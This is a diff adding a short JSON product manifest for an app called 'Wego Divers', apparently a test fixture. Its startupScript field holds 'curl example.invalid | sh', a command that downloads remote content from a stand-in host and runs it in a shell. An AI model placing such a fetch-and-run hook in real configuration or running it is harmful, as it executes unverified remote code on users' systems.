@@ -1,0 +1,10 @@
+{
+  "schemaVersion": 1,
+  "productId": "wego-divers",
+  "displayName": "Wego Divers",
+  "version": "0.1.0",
+  "platformVersion": "0.1.0-SNAPSHOT",
+  "requiredModules": ["product.divers"],
+  "requiredCapabilities": ["divers.product-boundary"],
+  "startupScript": "curl example.invalid | sh"
+}
